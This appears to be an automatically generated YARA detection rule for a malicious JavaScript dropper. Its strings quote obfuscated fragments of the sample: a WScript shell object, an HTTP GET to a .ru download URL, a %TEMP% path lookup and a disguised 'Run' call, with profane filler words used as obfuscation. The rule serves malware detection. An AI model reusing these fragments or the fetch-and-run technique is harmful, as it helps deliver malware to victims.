rule sig_20160428_e3414334d5eb1ae9591b5a5afbc94f30 {
  meta:
    description = "datamaliciousorder - file 20160428_e3414334d5eb1ae9591b5a5afbc94f30.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b0ba4252831b922ee7f1b071a4f1331b54c55e7188c58196a3521dfe8fca858a"

  strings:
    $s1  = "GptMiuCmdGajAavRtdCzx[XmpEomNomUreWurOnlSlm](\"G\" + \"ET\", \"http://berezy74.ru/n8sjad\", false);" fullword ascii
    $s2  = "function QtpVwrZocScsDhmNsyYcs(FfpWyhWopGddOgmCroFhx){HddMsjVgdJadIpaYwxFuv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function KoqRixJnnEcsLrmLhhAri() {return HddMsjVgdJadIpaYwxFuv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function QtpVwrZocScsDhmNsyYcs(FfpWyhWopGddOgmCroFhx){HddMsjVgdJadIpaYwxFuv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "function MuxIjhXejSfqHhtPbqLgc(WgcJnrDkjHasAkzFukOul, OgvWlsVrxEghJcxHhbDtj){TfdOazFylKokLytMwyGmu = TfdOazFylKokLytMwyGmu * 1; " ascii
    $s6  = "return WgcJnrDkjHasAkzFukOul - OgvWlsVrxEghJcxHhbDtj;};" fullword ascii
    $s7  = "if (GptMiuCmdGajAavRtdCzx[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "var HddMsjVgdJadIpaYwxFuv = function PsmSqrPhbIkwXozSftCfb() {return BekNxvIwyHsjDywHaxPyj[XkrPggOiuYqmRxtPgxHon](\"WScript\"+\"" ascii
    $s9  = "var BekNxvIwyHsjDywHaxPyj = this[\"WScript\"];" fullword ascii
    $s10 = "function KoqRixJnnEcsLrmLhhAri() {return HddMsjVgdJadIpaYwxFuv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function MuxIjhXejSfqHhtPbqLgc(WgcJnrDkjHasAkzFukOul, OgvWlsVrxEghJcxHhbDtj){TfdOazFylKokLytMwyGmu = TfdOazFylKokLytMwyGmu * 1; " ascii
    $s12 = "function DkyMreVzwZrxKigQmeGpx(){return DrhGuuNvbPtuBdeLfzGsr + \"\";};" fullword ascii
    $s13 = "var HddMsjVgdJadIpaYwxFuv = function PsmSqrPhbIkwXozSftCfb() {return BekNxvIwyHsjDywHaxPyj[XkrPggOiuYqmRxtPgxHon](\"WScript\"+\"" ascii
    $s14 = "function VdkYyfDkpEthNnoHdzNqh() {return ((DnuBxoIqyTcuTqwZrzFdq == true) && (DnuBxoIqyTcuTqwZrzFdq == TlbWzoOylOqmPtbXswSsg)) ?" ascii
    $s15 = "function VdkYyfDkpEthNnoHdzNqh() {return ((DnuBxoIqyTcuTqwZrzFdq == true) && (DnuBxoIqyTcuTqwZrzFdq == TlbWzoOylOqmPtbXswSsg)) ?" ascii
    $s16 = "return MuxIjhXejSfqHhtPbqLgc(1 == 1 ? WjlXooFseZwgNszNdfJwh : 0, 1 == 1 ? YioTomXkaQljTtvFlvRlk : 0);" fullword ascii
    $s17 = "var TlbWzoOylOqmPtbXswSsg = false;" fullword ascii
    $s18 = "function BdbVuvKuiHepLfiNcmTqa(FhyYteKzoXljQphXlhMyf) {var FcoEseEboQlcBupKixThn = (1, 2, 3, 4, 5, FhyYteKzoXljQphXlhMyf); retur" ascii
    $s19 = "var DnuBxoIqyTcuTqwZrzFdq = false;" fullword ascii
    $s20 = "function FhyBxbIytBpnHlyBeoQyw()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}